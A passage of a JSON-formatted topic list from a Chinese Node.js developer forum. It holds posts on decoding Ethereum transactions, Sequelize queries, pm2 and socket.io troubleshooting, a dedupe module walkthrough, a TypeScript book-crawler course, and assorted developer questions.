class=\"prettyprint\"><code>console.log(web3.eth.getTransaction(&#x27;0xaf4a217f6cc6f8c79530203372f3fbec160da83d1abe048625a390ba1705dd57&#x27;).input);\n&#x2F;&#x2F;0xa9059cbb0000000000000000000000007adee867ea91533879d083dd47ea81f0eee3a37e000000000000000000000000000000000000000000000000d02ab486cedbffff\n</code></pre><p>为了知道它正在调用哪个函数，必须事先知道合约的函数以创建哈希表。第一个32位<code>a9059cbb</code>是函数哈希的第一个32位。在这种情况下，函数是<code>transfer(address _to,uint256 _value)</code>，其哈希值是：</p>\n<pre class=\"prettyprint\"><code>console.log(web3.sha3(&#x27;transfer(address,uint256)&#x27;));\n&#x2F;&#x2F;0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b\n</code></pre><p>每个参数后面跟256位，所以在这种情况下地址是：</p>\n<pre class=\"prettyprint\"><code>0x0000000000000000000000007adee867ea91533879d083dd47ea81f0eee3a37e\n</code></pre><p>和无符号整数是：</p>\n<pre class=\"prettyprint\"><code>0x000000000000000000000000000000000000000000000000d02ab486cedbffff\n</code></pre><p><img src=\"http://blog.hubwiz.com/2018/12/14/ethereum-translate-inside/4.png\" alt></p>\n<p>接下来，如上所述，通过省略<code>to</code>字段，将创建合约。但合约的地址是如何确定的？以此交易为例：</p>\n<pre class=\"prettyprint\"><code>console.log(web3.eth.getTransactionReceipt(&#x27;0x77a4f46ff7bf8c084c34293fd654c60e107df42c5bcd2666f75c0b47a9352be5&#x27;).contractAddress);\n&#x2F;&#x2F;0x950041c1599529a9f64cf2be59ffb86072f00111\n</code></pre><p>合约地址是发件人地址的最后160位hash，其<code>nonce</code>可以预先确定。对于此交易，可以通过以下方式找到发件人和`nonce``：</p>\n<pre class=\"prettyprint\"><code>var contractTx = web3.eth.getTransaction(&#x27;0x77a4f46ff7bf8c084c34293fd654c60e107df42c5bcd2666f75c0b47a9352be5&#x27;);\nconsole.log(contractTx.from);\n&#x2F;&#x2F;0x84f9d8b0e74a7060e20b025c1ea63c2b171bae6f\nconsole.log(contractTx.nonce);\n&#x2F;&#x2F;0\n</code></pre><p>因此合约地址是：</p>\n<pre class=\"prettyprint\"><code>console.log(&#x27;0x&#x27; + util.bufferToHex(util.rlphash([&#x27;0x84f9d8b0e74a7060e20b025c1ea63c2b171bae6f&#x27;, 0])).slice(26));\n&#x2F;&#x2F;0x950041c1599529a9f64cf2be59ffb86072f00111\n</code></pre><p><img src=\"http://blog.hubwiz.com/2018/12/14/ethereum-translate-inside/4.png\" alt></p>\n<p>现在我们已经对这些十六进制了解了一点！</p>\n<p>以太坊和智能合约具有破坏许多行业的巨大潜力。网上有很多资源，你可以在下面找到一些资源继续探索以太坊！</p>\n<p>以太坊主站点：<a href=\"https://www.ethereum.org/\">https://www.ethereum.org/</a>\nMist以太坊的客户端之一：<a href=\"https://github.com/ethereum/mist/releases\">https://github.com/ethereum/mist/releases</a>\nSolidity：<a href=\"http://solidity.readthedocs.io/en/latest/\">http://solidity.readthedocs.io/en/latest/</a>\nWeb3 api：<a href=\"https://github.com/ethereum/wiki/wiki/JavaScript-API\">https://github.com/ethereum/wiki/wiki/JavaScript-API</a>\n社区讨论：<a href=\"https://www.reddit.com/r/ethereum/\">https://www.reddit.com/r/ethereum/</a>\n以太坊入门教程：<a href=\"http://xc.hubwiz.com/course/5a952991adb3847553d205d1?affid=1217cnode\">http://xc.hubwiz.com/course/5a952991adb3847553d205d1</a></p>\n</div>","title":"通过node.js来看看在以太坊交易中都发生了什么？","last_reply_at":"2018-12-17T09:59:24.283Z","good":false,"top":false,"reply_count":2,"visit_count":835,"create_at":"2018-12-17T02:36:11.007Z","author":{"loginname":"2722119447","avatar_url":"https://avatars1.githubusercontent.com/u/14145791?v=4&s=120"}},{"id":"5c1601297ec239239ff573f9","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><p>就是在学习Sequelize Executing raw SQL queries这一节时，显示出来的结果是两次重复的。\n例如：</p>\n<pre class=\"prettyprint\"><code>sequelize.query(&#x27;select * from pets where name = ?&#x27;, { raw: true, replacements: [&#x27;Odie&#x27;] }).then(myTableRows =&gt; {\n  console.log(myTableRows);\n});\n</code></pre><p>执行结果：</p>\n<pre class=\"prettyprint\"><code>[ [ TextRow {\n      id: &#x27;d-1544782050448&#x27;,\n      name: &#x27;Odie&#x27;,\n      gender: 0,\n      birth: &#x27;2008-08-08&#x27;,\n      createdAt: 1544782050448,\n      updatedAt: 1544782050448,\n      version: 0 } ],\n  [ TextRow {\n      id: &#x27;d-1544782050448&#x27;,\n      name: &#x27;Odie&#x27;,\n      gender: 0,\n      birth: &#x27;2008-08-08&#x27;,\n      createdAt: 1544782050448,\n      updatedAt: 1544782050448,\n      version: 0 } ] ]\n</code></pre><p>是不是我哪写错了，还是就是这样？</p>\n</div>","title":"关于sequelize连接操作mysql的一个小小地方的疑惑","last_reply_at":"2018-12-17T08:51:23.668Z","good":false,"top":false,"reply_count":2,"visit_count":768,"create_at":"2018-12-16T07:39:21.768Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5c1755017ec239239ff5794e","author_id":"5c10c50f7ec239239ff561c2","tab":"share","content":"<div class=\"markdown-text\"><p>发现最近 AR 相关的 app 越来越多了，这个 app 叫做 “Deck Your Halls”，挺好玩的。\n这里拖一棵圣诞树，那里放一个雪人，还可以放一个玩具飞机，绕着房子不断转圈，最棒的是这些装饰都会动，一分钟就可以把家里弄得挺有节日气氛的。刚才试了一下，本来挺冷清的，一下子变得特别热闹，感觉尽管圣诞节自己一个人在家好像都没有这么孤独，哈哈。</p>\n<p>不过手机的话，装饰完，也许就能发个朋友圈吧，因为不可能一直举着手机看了。什么时候有一个强大的 “google glass 类产品”，这种 AR 会更有市场吧。</p>\n<p>官方的 app 截图如下，这个链接也有更多介绍：<a href=\"https://mergeek.com?project_id=3gQrk1AlQlWx9DVJ\">Deck Your Halls</a>\n<img src=\"//static.cnodejs.org/Fq_SJRvczQOtYfs0NFQyp1elQ3Z0\" alt=\"image.png\"></p>\n</div>","title":"圣诞节快到了，给大家分享个神器","last_reply_at":"2018-12-17T07:49:21.176Z","good":false,"top":false,"reply_count":0,"visit_count":736,"create_at":"2018-12-17T07:49:21.176Z","author":{"loginname":"Kilen","avatar_url":"https://avatars1.githubusercontent.com/u/2741628?v=4&s=120"}},{"id":"5c022a4b39c0af64fddb7a37","author_id":"5c02290939c0af64fddb7a30","tab":"ask","content":"<div class=\"markdown-text\"><p>考虑到并发量及安全之类的问题，不知道node做这种东西适合吗？请大佬指点先小弟，拜谢</p>\n</div>","title":"有这样一个需求，有三百辆左右的共享单车车锁通过tcp与我的服务端通信，我可以用net模块创建tcp服务端做吗？","last_reply_at":"2018-12-17T07:47:24.771Z","good":false,"top":false,"reply_count":7,"visit_count":1409,"create_at":"2018-12-01T06:29:31.814Z","author":{"loginname":"zhiruoyu88","avatar_url":"https://avatars0.githubusercontent.com/u/20127886?v=4&s=120"}},{"id":"5c172bfe7ec239239ff577dd","author_id":"5c172b94f3d48d2397c11ead","tab":"ask","content":"<div class=\"markdown-text\"><p>如何用Jekins和NodeJs实现CI/DI的问题？\n最好是有详细的步骤或者教程。</p>\n</div>","title":"如何整合Jekins和Nodejs？","last_reply_at":"2018-12-17T06:08:45.921Z","good":false,"top":false,"reply_count":3,"visit_count":668,"create_at":"2018-12-17T04:54:22.650Z","author":{"loginname":"WXzhongwang","avatar_url":"https://avatars1.githubusercontent.com/u/27359059?v=4&s=120"}},{"id":"5c1715897ec239239ff57777","author_id":"5b44b87e35342ab06906140f","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FhUs2YLI34Z5HnpKif54QCDK8SX8\" alt=\"WechatIMG22.png\"></p>\n<p><img src=\"//static.cnodejs.org/FlE371CstFxCm4_TvosrlzZfhwQz\" alt=\"WechatIMG23.png\"></p>\n<hr>\n<ol>\n<li>\n<p>get 函数要求返回一个 promise 对象，而 return <a href=\"http://this.name\">this.name</a>，并不满足，为何编译通过？</p>\n</li>\n<li>\n<p>直接 return 一个字符串，编译器报错，为什么 return <a href=\"http://this.name\">this.name</a>，却可以通过编译？（<a href=\"http://this.name\">this.name</a> 实际也是一个字符串）</p>\n</li>\n</ol>\n</div>","title":"问一个关于 ts 的问题","last_reply_at":"2018-12-17T05:31:03.716Z","good":false,"top":false,"reply_count":4,"visit_count":680,"create_at":"2018-12-17T03:18:33.537Z","author":{"loginname":"lyf103104","avatar_url":"https://avatars3.githubusercontent.com/u/25381577?v=4&s=120"}},{"id":"5bfc0030be1b120abac5d102","author_id":"5a924b1e71327bb413bbfe26","tab":"ask","content":"<div class=\"markdown-text\"><p>在做移动端项目，想要的效果是浏览文章列表当进入详情页面时再返回应该还是之前的滚动位置。</p>\n<p>貌似没有一个很好的解决方案？</p>\n</div>","title":"react有没办法做到后退不刷新？","last_reply_at":"2018-12-17T03:37:59.491Z","good":false,"top":false,"reply_count":17,"visit_count":1899,"create_at":"2018-11-26T14:16:16.200Z","author":{"loginname":"six-666","avatar_url":"https://avatars0.githubusercontent.com/u/36760287?v=4&s=120"}},{"id":"5c10c7327ec239239ff561d7","author_id":"5c10c50f7ec239239ff561c2","tab":"share","content":"<div class=\"markdown-text\"><p>有些 JS 项目不是很想用 Lodash.js，不过又挺想用里面的方法的，这个 “30 seconds of code” 挺适合的。\n里面有很多挺常用的代码片段，比如 “获取 url 里面的参数”，比如 “flatten 一个数组” 直接复制粘贴到项目里就能用了，挺方便的</p>\n<p>详细可以看看 <a href=\"https://mergeek.com?project_id=G01azyA8zbmj3blg\">30 seconds of code</a>\n<img src=\"//static.cnodejs.org/FhiBY2h5Bm8EXaMC6LwuzEOqiTnF\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/Fkoa7ctvFvKH34kd8mkPbhoc8w87\" alt=\"image.png\"></p>\n</div>","title":"觉得 Lodash.js 太重的话，这个网站就挺适合的","last_reply_at":"2018-12-17T02:55:22.490Z","good":false,"top":false,"reply_count":5,"visit_count":1403,"create_at":"2018-12-12T08:30:42.223Z","author":{"loginname":"Kilen","avatar_url":"https://avatars1.githubusercontent.com/u/2741628?v=4&s=120"}},{"id":"5c160dcbf3d48d2397c11b1e","author_id":"57e330bcc4ae8ff239776e33","tab":"ask","content":"<div class=\"markdown-text\"><p>我指向了app.js  打包出来好像没反应…</p>\n</div>","title":"我想用pkg npm包 把egg应用打包成exe文件，请问egg项目的入口文件是哪个呀.....","last_reply_at":"2018-12-17T02:33:32.917Z","good":false,"top":false,"reply_count":4,"visit_count":617,"create_at":"2018-12-16T08:33:15.469Z","author":{"loginname":"rianran1993","avatar_url":"https://avatars2.githubusercontent.com/u/22359049?v=4&s=120"}},{"id":"5b4419df13ca2fe569fb924a","author_id":"5b37469f57137f22415c5140","tab":"share","content":"<div class=\"markdown-text\"><p>TypeScript 是一种由微软开发的自由和开源的编程语言，它是JavaScript的一个超集，扩展了JavaScript的语法。</p>\n<p>谷歌的Angular中用的就是ts的语法，现在你会发现大牛们开发Nodejs 、React、Vue都喜欢用TS的语法。</p>\n<p>Typescript更像Java这样的后端语言，更标准，让前端JS有能力开发大型项目。</p>\n<p><strong>不说了Typescript百度网盘下载地址：</strong></p>\n<p><a href=\"https://pan.baidu.com/s/17jllW0igIOWjM3YCvWS-bg\">https://pan.baidu.com/s/17jllW0igIOWjM3YCvWS-bg</a></p>\n<p><strong>Typescript目录</strong></p>\n<p><img src=\"//static.cnodejs.org/Fu1K3pEyahnMVuU6VR8uc9oOMh09\" alt=\"typescript视频教程.png\"></p>\n</div>","title":"2018年最新Typescript视频教程-Nodejs Vue Angular React必备基础-【14集网盘免费下载】","last_reply_at":"2018-12-16T16:50:25.200Z","good":false,"top":false,"reply_count":9,"visit_count":3677,"create_at":"2018-07-10T02:28:47.640Z","author":{"loginname":"koa666","avatar_url":"https://avatars3.githubusercontent.com/u/37576865?v=4&s=120"}},{"id":"5c122c6cf3d48d2397c10e77","author_id":"5a466a64f320ae9f0dd581c4","tab":"ask","content":"<div class=\"markdown-text\"><p>目前该项目前端基本用es5加模版引入js闭包的形式来写，\n难以维护的主要原因主要有以下原因:\n1、项目非常大，相当一般后台管理系统的十倍，前后端不分离\n2、采用es5用jq写法，没有模块化，模版嵌套模式。\n3、很多页面代码写到几千行，html和js都是.一报错，找错误的地方都找死人</p>\n<p>使用egg重构主要是想达到的目的:\n1、模块化 抽成小模块形式便于维护\n2、引入es6解决回调嵌套问题\n有重构的经验的大佬帮分析下，谢谢;</p>\n</div>","title":"公司有一个前后端不分离的java项目，前端目前全是模版加jq，使用egg重构前后端不分离有什么要注意的？","last_reply_at":"2018-12-16T11:04:35.680Z","good":false,"top":false,"reply_count":9,"visit_count":985,"create_at":"2018-12-13T09:54:52.696Z","author":{"loginname":"ChrisChenSZ","avatar_url":"https://avatars0.githubusercontent.com/u/17292590?v=4&s=120"}},{"id":"5c13753cf3d48d2397c114a9","author_id":"5b5d6fef58db3ccf66a4501e","tab":"ask","content":"<div class=\"markdown-text\"><p>使用pm2 start  pm2.config.js 或者 npm run pm2时都一直重新启动,但直接用pm2 start index.js却可以。\n而且之前我在ECS上也用这个配置文件部署过,之前pm2 start  pm2.config.js 或者 npm run pm2都可以运行,\n后来我把文件夹删了,用putty重新传了一次,程序基本没改，安装的时候npm install权限错误,我就按以下方法设置了权限：\n<img src=\"//static.cnodejs.org/FjECawKAn-ZU9fx_iuTM_SGa9A8K\" alt=\"11.PNG\">\n应该更这个权限无关,不过还是提一下\n请教高手们解答\n配置文件 pm2.config.js\nmodule.exports={\napps:[{</p>\n<pre class=\"prettyprint\"><code>    &quot;name&quot;: &quot;52tyjy&quot;,\n    &quot;script&quot;: &quot;.&#x2F;index.js&quot;,\n    &quot;args&quot;: &quot;&quot;,\n    &quot;interpreter&quot;: &quot;&quot;,\n    &quot;interpreter_args&quot;: &quot;&quot;,\n    &quot;watch&quot;: true,\n    &quot;ignore_watch&quot;: [\n    &quot;node_modules&quot;,\n    &quot;mylogs&quot;\n    ],\n    &quot;exec_mode&quot;: &quot;cluster_mode&quot;,\n    &quot;instances&quot;: &quot;max&quot;,\n    &quot;max_memory_restart&quot;: &quot;1024M&quot;,\n    &quot;error_file&quot;: &quot;.&#x2F;mylogs&#x2F;pm2-err.log&quot;,\n    &quot;out_file&quot;: &quot;.&#x2F;mylogs&#x2F;pm2-out.log&quot;,\n    &quot;merge_logs&quot;: true,\n    &quot;log_date_format&quot;: &quot;YYYY-MM-DD HH:mm:ss&quot;,\n    &quot;min_uptime&quot;: &quot;60s&quot;,\n    &quot;max_restarts&quot;: &quot;30&quot;,\n    &quot;autorestart&quot;: true,\n    &quot;cron_restart&quot;: &quot;&quot;,\n    &quot;restart_delay&quot;: 60,\n    &quot;env&quot;: {\n        &quot;NODE_ENV&quot;: &quot;production&quot;\n        },\n    &quot;env_dev&quot;: {\n        &quot;NODE_ENV&quot;: &quot;development&quot;,\n        &quot;REMOTE_ADDR&quot;: &quot;&quot;\n        },\n    &quot;env_test&quot;: {\n        &quot;NODE_ENV&quot;: &quot;test&quot;,\n        &quot;REMOTE_ADDR&quot;: &quot;&quot;\n        }\n    }\n&#x2F;&#x2F;可以配置多个app\n]\n</code></pre><p>}</p>\n<p>答案google了以下：\n<img src=\"//static.cnodejs.org/FtefpSLYLjUaNiPx9IvMrJsU9a7g\" alt=\"22.PNG\"></p>\n</div>","title":"问题已解决，google有答案，pm2用了配置文件一直总是重新启动,不用配置文件时直接pm2 start可以工作","last_reply_at":"2018-12-16T10:24:30.545Z","good":false,"top":false,"reply_count":1,"visit_count":716,"create_at":"2018-12-14T09:17:48.991Z","author":{"loginname":"ailuhaosi","avatar_url":"https://avatars3.githubusercontent.com/u/30113164?v=4&s=120"}},{"id":"51dfc648f4963ade0e48ac35","author_id":"51b9a4ff60af11cd33016491","content":"<div class=\"markdown-text\"><p>1、如果client端断开网络，我在Server端如何准去判断client端断开连接了！！！！<br>\n2、disconnect不管用，只有在client端关闭浏览器的时候 ，server端才能检测到。\n好纠结 ！麻烦遇到这样问题的告诉一下解决方案 qq：929541303</p>\n</div>","title":"socket.io 如何准确判断server与client之间断开连接","last_reply_at":"2018-12-16T09:04:06.046Z","good":false,"top":false,"reply_count":16,"visit_count":61845,"create_at":"2013-07-12T09:03:04.900Z","author":{"loginname":"babata","avatar_url":"//gravatar.com/avatar/9ede7c3ddbb56414b925bdd5f350942f?size=48"}},{"id":"5c0763861c62d83349350f42","author_id":"57067a058265278d59c7e61f","tab":"share","content":"<div class=\"markdown-text\"><h2>1、git地址</h2>\n<p><a href=\"https://github.com/seriousManual/dedupe\">https://github.com/seriousManual/dedupe</a></p>\n<h2>2、作用</h2>\n<p>剔除一个数组中重复的元素，并输出新数组</p>\n<h2>3、例子和源码解析</h2>\n<h3>3.1 例子</h3>\n<pre class=\"prettyprint language-javascript\"><code>const dedupe = require(&#x27;dedupe&#x27;)\n\nlet fromer = [1, 3, 5, 4, 3]\nlet newer = dedupe(fromer)\nconsole.log(newer) &#x2F;&#x2F; 输出：[ 1, 3, 5, 4 ]\n\nlet fromerObjArray = [{&#x27;name&#x27;: &#x27;Frank&#x27;}, {&#x27;name&#x27;: &#x27;Sun&#x27;}, {&#x27;name&#x27;: &#x27;Quan&#x27;}, {&#x27;name&#x27;: &#x27;Huang&#x27;}, {&#x27;name&#x27;: &#x27;Gold&#x27;}]\nlet newerObjArray = dedupe(fromerObjArray)\nconsole.log(newerObjArray) &#x2F;&#x2F; 输出：[ { name: &#x27;Frank&#x27; }, { name: &#x27;Sun&#x27; }, { name: &#x27;Quan&#x27; }, { name: &#x27;Huang&#x27; }, { name: &#x27;Gold&#x27;}]\n\nlet formerComplexArray = [\n  { &#x27;age&#x27;: &#x27;28&#x27;, &#x27;name&#x27;: &#x27;Frank&#x27; },\n  { &#x27;age&#x27;: &#x27;20&#x27;, &#x27;name&#x27;: &#x27;Sun&#x27; },\n  { &#x27;age&#x27;: &#x27;21&#x27;, &#x27;name&#x27;: &#x27;Quan&#x27; },\n  { &#x27;age&#x27;: &#x27;20&#x27;, &#x27;name&#x27;: &#x27;Huang&#x27; },\n  { &#x27;age&#x27;: &#x27;20&#x27;, &#x27;name&#x27;: &#x27;Gold&#x27; }\n]\nlet newerComplexArray = dedupe(formerComplexArray)\nconsole.log(newerComplexArray) &#x2F;&#x2F; 输出：[ { age: &#x27;28&#x27;, name: &#x27;Frank&#x27; }, { age: &#x27;20&#x27;, name: &#x27;Sun&#x27; }, { age: &#x27;21&#x27;, name: &#x27;Quan&#x27; }, { age: &#x27;20&#x27;, name: &#x27;Huang&#x27; }, { age: &#x27;20&#x27;, name: &#x27;Gold&#x27; } ]\n\nlet formerArrayFun = [\n  { a: 2, b: 1 },\n  { a: 1, b: 2 },\n  { a: 1, b: 3 },\n  { a: 1, b: 4 }\n]\nlet newerAFunArray = dedupe(formerArrayFun, value =&gt; value.a)\nlet newerBFunArray = dedupe(formerArrayFun, value =&gt; value.b)\nconsole.log(newerAFunArray) &#x2F;&#x2F; 输出：[ { a: 2, b: 1 }, { a: 1, b: 2 } ]\nconsole.log(newerBFunArray) &#x2F;&#x2F; 输出：[ { a: 2, b: 1 }, { a: 1, b: 2 }, { a: 1, b: 3 }, { a: 1, b: 4 } ]\n\n</code></pre><h3>3.2 源码</h3>\n<pre class=\"prettyprint language-javascript\"><code>function dedupe (client, hasher) {\n    hasher = hasher || JSON.stringify\n\n    const clone = []\n    const lookup = {}\n\n    for (let i = 0; i &lt; client.length; i++) {\n        let elem = client[i]\n        let hashed = hasher(elem)\n\n        if (!lookup[hashed]) {\n            clone.push(elem)\n            lookup[hashed] = true\n        }\n    }\n\n    return clone\n}\n\nmodule.exports = dedupe\n</code></pre><h3>3.3 源码解析</h3>\n<p>1）该模块暴露出去的也是两个参数。如果第二个参数不存在的话，就赋值JSON.stringify；</p>\n<p>2）接着遍历目标对象，对每个元素实例化或者进行hasher操作；</p>\n<p>3）然后用lookup记录是否遍历过该元素，如果遍历过，在lookup保存该元素为true，并将元素保存到clone中；</p>\n<p>4）如果传入hasher，那么将每个元素进行hasher操作，并在lookup记录是否操作过该元素。</p>\n</div>","title":"npm模块学习之dedupe","last_reply_at":"2018-12-16T06:12:20.288Z","good":false,"top":false,"reply_count":1,"visit_count":877,"create_at":"2018-12-05T05:35:02.599Z","author":{"loginname":"sunfeng90","avatar_url":"https://avatars1.githubusercontent.com/u/11543206?v=4&s=120"}},{"id":"5c0f3099f3d48d2397c0fec1","author_id":"539dc067c3ee0b58202c7840","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>视频课程  入口</p>\n</blockquote>\n<p>《蜘蛛实时爬取数据提供图书信息微服务》\n<a href=\"https://segmentfault.com/l/1500000017329004\">https://segmentfault.com/l/1500000017329004</a></p>\n<blockquote>\n<p>相关视频：</p>\n</blockquote>\n<ul>\n<li><a href=\"https://segmentfault.com/l/1500000016954243\">运用typescript进行node.js后端开发精要</a></li>\n<li><a href=\"https://segmentfault.com/l/1500000017034959\">nodejs实战之智能微服务快速开发框架</a></li>\n<li><a href=\"https://segmentfault.com/l/1500000017108031\">JSON-ORM（对象关系映射）设计与实现</a></li>\n<li><a href=\"https://segmentfault.com/l/1500000017274102\">Koa2封装数据库高级操作</a></li>\n<li><a href=\"https://segmentfault.com/l/1500000017329004\">蜘蛛实时爬取数据提供图书信息微服务</a></li>\n</ul>\n<h2>特点</h2>\n<ul>\n<li>成熟项目经验，经过总结、提炼、精简、重构，实现图书信息的实时抓取并提供restful服务。</li>\n<li>一种ajax动态内页内容的抓取的讲解。</li>\n<li>正则表达式与内页解析工具的实战。</li>\n<li>课程内容与结构经过精心准备，设计合理、节奏紧凑、内容翔实。</li>\n<li>真实再现了思考、编码、调试、除错的整个开发过程。</li>\n</ul>\n<h2>项目介绍</h2>\n<p>基于gels（凝胶项目）-- 一个微服务管理快速开发框架和网络爬虫技术开发图书信息微服务，使用typescript语言编写。</p>\n<h2>设计思路</h2>\n<p>使用gels，只需要关注核心业务，其它由框架提供快速开发接口。图书信息实时抓取并使用自制循环队列进行缓存和批量写入数据库，图片都保存到本地。即：一本书只到网上爬取一次，并用循环队列来减少数据库交互，加大并发支持。</p>\n<h2>适合人群</h2>\n<ul>\n<li>Typescript初学者与中级者，带你逐步进入后端开发奇妙世界</li>\n<li>适合从实战角度来学习编程的人，带你一步步实现一个完整的项目</li>\n<li>node.js平台开发者，与你分享个人的设计思想与编程技巧</li>\n<li>熟练前端开发者，想步入后端编程的行列，从实战出发吧</li>\n<li>想了解网页爬虫与动态网页抓取技术的实践者</li>\n</ul>\n<h2>gels安装运行</h2>\n<ul>\n<li>在终端（Terminal）中依次运行如下命令<pre class=\"prettyprint\"><code>git clone https:&#x2F;&#x2F;github.com&#x2F;zhoutk&#x2F;gels\ncd gels\nnpm i -g yarn\nyarn global install typescript tslint nodemon\nyarn install\ntsc -w          &#x2F;&#x2F;或 command + shift + B，选 tsc:监视\nyarn start      &#x2F;&#x2F;或 node .&#x2F;dist&#x2F;index.js\n</code></pre></li>\n<li>运行数据脚本，建立图书存储表<pre class=\"prettyprint\"><code>    CREATE TABLE &#96;books&#96; (\n    &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,\n    &#96;isbn&#96; varchar(32) NOT NULL DEFAULT &#x27;&#x27;,\n    &#96;book_name&#96; varchar(1024) DEFAULT &#x27;&#x27;,\n    &#96;author_name&#96; varchar(128) DEFAULT &#x27;&#x27;,\n    &#96;publisher&#96; varchar(1024) DEFAULT &#x27;&#x27;,\n    &#96;publish_day&#96; varchar(64) DEFAULT NULL,\n    &#96;details_json&#96; json DEFAULT NULL,\n    &#96;create_time&#96; datetime DEFAULT CURRENT_TIMESTAMP,\n    &#96;update_time&#96; datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,\n    PRIMARY KEY (&#96;id&#96;),\n    UNIQUE KEY &#96;isbn&#96; (&#96;isbn&#96;)\n    ) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8;\n</code></pre></li>\n<li>配置文件示例，./src/config/configs.ts<pre class=\"prettyprint\"><code>export default {\n    inits: {\n        directory: {\n            run: false,\n            dirs: [&#x27;public&#x2F;upload&#x27;, &#x27;public&#x2F;temp&#x27;]\n        }\n    },\n    port: 5000,\n    db_dialect: &#x27;mysql&#x27;,\n    dbconfig: {\n        db_host: &#x27;localhost&#x27;,\n        db_port: 3306,\n        db_name: &#x27;strest&#x27;,\n        db_user: &#x27;root&#x27;,\n        db_pass: &#x27;123456&#x27;,\n        db_char: &#x27;utf8mb4&#x27;,\n        db_conn: 10,\n    },\n    jwt: {\n        secret: &#x27;zh-tf2Gp4SFU&gt;a4bh_$3#46d0e85W10aGMkE5xKQ&#x27;,\n        expires_max: 36000      &#x2F;&#x2F;10小时，单位：秒\n    },\n}\n</code></pre></li>\n</ul>\n<h2>项目结构</h2>\n<pre class=\"prettyprint\"><code>├── package.json\n├── src                              &#x2F;&#x2F;源代码目录\n│   ├── app.ts                       &#x2F;&#x2F;koa配置及启动\n│   ├── common                       &#x2F;&#x2F;通用函数或元素目录\n│   │   ├── globUtils.ts \t\t\t\n│   ├── config                       &#x2F;&#x2F;配置文件目录\n│   │   ├── configs.ts\n|   ├── dao   \n|   |   ├── books.ts                 &#x2F;&#x2F;图书抓取业务\n│   ├── db                           &#x2F;&#x2F;数据封装目录\n│   │   ├── baseDao.ts\n│   ├── globals.d.ts                 &#x2F;&#x2F;全局声明定义文件\n│   ├── index.ts                     &#x2F;&#x2F;运行入口\n│   ├── inits                        &#x2F;&#x2F;启动初始化配置目录\n│   │   ├── global.ts\n│   ├── middlewares                  &#x2F;&#x2F;中间件目录\n│   │   └── session.ts\n│   └── routers                      &#x2F;&#x2F;路由配置目录\n│       └── router_rs.ts\n├── tsconfig.json\n└── tslint.json\n</code></pre><h2>使用的数据库接口</h2>\n<ul>\n<li>数据库操作接口，包括基本CURD，两个执行手写sql接口，一个批量插入与更新二合一接口，一个事务操作接口。实践证明，下面八个接口，在绝大部分情况下已经足够。<pre class=\"prettyprint\"><code>export default interface IDao {\n    select(tablename: string, params: object, fields?: Array&lt;string&gt;): Promise&lt;any&gt;;\n    insert(tablename: string, params: object): Promise&lt;any&gt;;\n    update(tablename: string, params: object, id: string|number): Promise&lt;any&gt;;\n    delete(tablename: string, id: string|number): Promise&lt;any&gt;;\n    querySql(sql: string, values: Array&lt;any&gt;, params: object, fields?: Array&lt;string&gt;): Promise&lt;any&gt;;\n    execSql(sql: string, values: Array&lt;any&gt;): Promise&lt;any&gt;;\n    insertBatch(tablename: string, elements: Array&lt;any&gt;): Promise&lt;any&gt;;\n    transGo(elements: Array&lt;TransElement&gt;, isAsync?: boolean): Promise&lt;any&gt;;\n}\n</code></pre></li>\n</ul>\n<h2>使用默认路由</h2>\n<ul>\n<li>/rs/:table[/:id]，支持四种restful请求，GET, POST, PUT, DELELTE，除GET外，其它请求检测是否授权</li>\n</ul>\n<h2>提供的restful_api</h2>\n<ul>\n<li>[GET] /rs/books[?key=value&amp;…], 列表查询，支持各种智能查询</li>\n<li>[GET] /rs/books/{isbn}, 单条查询，若缓存及库中没有，从网络爬取图书信息</li>\n<li>[POST] /rs/books, 新增图书信息</li>\n<li>[PUT] /rs/books/{id}, 修改图书信息</li>\n<li>[DELETE] /rs/books/{id}, 删除图书信息</li>\n</ul>\n<h2>相关视频课程</h2>\n<p><a href=\"https://segmentfault.com/l/1500000016954243\">运用typescript进行node.js后端开发精要</a><br>\n<a href=\"https://segmentfault.com/l/1500000017034959\">nodejs实战之智能微服务快速开发框架</a>\n<a href=\"https://segmentfault.com/l/1500000017108031\">JSON-ORM（对象关系映射）设计与实现</a>\n<a href=\"https://segmentfault.com/l/1500000017274102\">Koa2封装数据库高级操作</a>\n<a href=\"https://segmentfault.com/l/1500000017329004\">蜘蛛实时爬取数据提供图书信息微服务</a></p>\n<h2>资源地址</h2>\n<p>凝胶（gels）项目： <a href=\"https://github.com/zhoutk/gels\">https://github.com/zhoutk/gels</a>\n视频讲座资料： <a href=\"https://github.com/zhoutk/sifou\">https://github.com/zhoutk/sifou</a>\n个人博客： <a href=\"https://segmentfault.com/blog/zhoutk\">https://segmentfault.com/blog/zhoutk</a></p>\n</div>","title":"typescript学习--蜘蛛实时爬取数据提供图书信息微服务","last_reply_at":"2018-12-15T15:23:42.801Z","good":false,"top":false,"reply_count":1,"visit_count":836,"create_at":"2018-12-11T03:35:53.995Z","author":{"loginname":"zhoutk","avatar_url":"https://avatars2.githubusercontent.com/u/1542521?v=4&s=120"}},{"id":"5c10856b7ec239239ff55f9f","author_id":"570b551012def0933c43ac1b","tab":"share","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>自今年年初离职后，是飘了又飘，头都没反应过来；做过直播，app应用，后来觉得没意思，去做了游戏。\n可游戏不好混呐，今年4月份到9月份在一家创业公司做游戏，整个公司说没就没了，创业公司嘛，也挺正常的；\n后来就找了家上市公司做游戏，没想到吧～  项目组说没就没了，我能说什么吗。惨呐惨呐。\n</code></pre></div>","title":"今年一年飘了2次，你敢信？","last_reply_at":"2018-12-15T04:10:20.874Z","good":false,"top":false,"reply_count":22,"visit_count":2116,"create_at":"2018-12-12T03:50:03.799Z","author":{"loginname":"linkenliu","avatar_url":"https://avatars0.githubusercontent.com/u/17923055?v=4&s=120"}},{"id":"5c146e16f3d48d2397c11770","author_id":"5be2daa0646a05745b7b97d8","tab":"share","content":"<div class=\"markdown-text\"><p>banlg 这个玩意-- angular-cli 